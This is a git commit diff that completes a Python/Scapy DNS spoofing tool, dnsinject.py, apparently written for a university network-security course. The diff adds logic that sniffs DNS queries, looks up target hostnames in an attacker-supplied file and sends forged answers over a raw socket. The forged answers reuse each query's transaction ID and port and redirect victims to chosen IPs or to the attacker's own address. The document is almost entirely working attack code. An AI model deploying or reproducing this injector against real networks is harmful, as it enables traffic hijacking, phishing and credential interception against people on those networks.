605d85192a039628dd2172b06aa10dd4a8dd50bd
Michael Salerno <michael.j.salerno@stonybrook.edu>
2016-05-03 16:28:18 -0400

    dnsinject is done

--- dnsinject.py
+++ dnsinject.py
@@ -5,12 +5,11 @@ import socket
 
 from scapy.layers.dns import DNSQR, DNS, DNSRR
 from scapy.layers.inet import IP, UDP
-
+import netifaces as ni
 
 hosts = {}
 s = None
-
-conf
+my_ip = '127.0.0.1'
 
 
 def id_generator(size=6, chars=string.ascii_lowercase):
@@ -18,40 +17,36 @@ def id_generator(size=6, chars=string.ascii_lowercase):
 
 
 def dns_spoof(pkt):
+    global s, hosts, my_ip
+    spoofed_ip = None
     if pkt.dport == 53 and UDP in pkt and DNSRR not in pkt:
-        # spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
-        #                   UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
-        #                   DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
-        #                   an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata='6.6.6.6'))
-
-
-        # spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
-        #               UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
-        #               DNS(id=pkt[DNS].id, qr=1, rd=1, ra=1, qd=pkt[DNS].qd, \
-        #                   an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata='6.6.6.6'))
+        print('query for: ' + pkt[DNSQR].qname)
+        if pkt[DNSQR].qname[:-1] in hosts:
+            spoofed_ip = hosts[pkt[DNSQR].qname[:-1]]
+            print('will inject')
+        elif len(hosts) == 0:
+            spoofed_ip = my_ip
+        else:
+            print('wont inject')
+            return
 
         spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) \
-                  / UDP(dport=pkt[UDP].sport, sport=53) \
-                  / DNS(id=pkt[DNS].id,
-                        qr=1L,
-                        qd=DNSQR(qname=pkt[DNSQR].qname),
-                        an=DNSRR(rrname=pkt[DNS].qd.qname, rdata='98.138.253.109')
-                )
+                      / UDP(dport=pkt[UDP].sport, sport=53) \
+                      / DNS(id=pkt[DNS].id,
+                            qr=1L,
+                            qd=DNSQR(qname=pkt[DNSQR].qname),
+                            an=DNSRR(rrname=pkt[DNS].qd.qname, rdata=spoofed_ip)
+                            )
 
-        #del spoofed_pkt[IP].len
-        #del spoofed_pkt[UDP].len
-        #del spoofed_pkt[UDP].chksum
-
-        print('opcode = ' + str(spoofed_pkt[DNS].opcode))
-        #send(spoofed_pkt)
-        print 'sending to: ' + pkt[IP].src
-        sent=s.sendto(str(spoofed_pkt), (pkt[IP].src, pkt[UDP].sport))
-        print sent
-        print('injected')
+        sent = s.sendto(str(spoofed_pkt), (pkt[IP].src, pkt[UDP].sport))
+        if sent < 1:
+            print('There was a problem sending.')
+        else:
+            print('injected')
 
 
 def main():
-    global s
+    global s, my_ip
     parser = argparse.ArgumentParser(description='DNS spoofer.')
 
     parser.add_argument('-i', help='Listen on network device <interface> (e.g., eth0). If not specified,\
@@ -78,16 +73,22 @@ def main():
             line = line.split()
             if len(line) != 2:
                 continue
-            hosts[line[0].strip()] = line[1].strip()
+            hosts[line[1].strip()] = line[0].strip()
 
         f.close()
+    print(hosts)
 
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
-        print 'got raw socket'
     except socket.error, msg:
         print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
         sys.exit()
+
+    if args.i is None:
+        my_ip = ni.ifaddresses(conf.iface)[2][0]['addr']
+    else:
+        my_ip = my_ip = ni.ifaddresses(args.i)[2][0]['addr']
+
 
     sniff(iface=args.i, filter=args.expression, prn=dns_spoof, lfilter=lambda x: x.haslayer(DNSQR))
 
